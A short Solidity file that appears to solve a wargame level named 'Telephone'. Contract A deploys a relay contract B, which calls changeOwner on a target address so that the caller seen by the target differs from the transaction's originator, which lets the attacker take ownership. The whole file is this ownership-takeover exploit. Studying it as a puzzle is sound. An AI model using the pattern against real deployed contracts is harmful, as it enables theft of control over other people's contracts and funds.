// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract B {
    function call(address _telephone, address new_owner) public {
        Telephone telephone = Telephone(_telephone);
        telephone.changeOwner(new_owner);
    }
}

contract A {
    function call(address _telephone, address new_owner) public {
        B b = new B();
        b.call(_telephone, new_owner);
    }
}
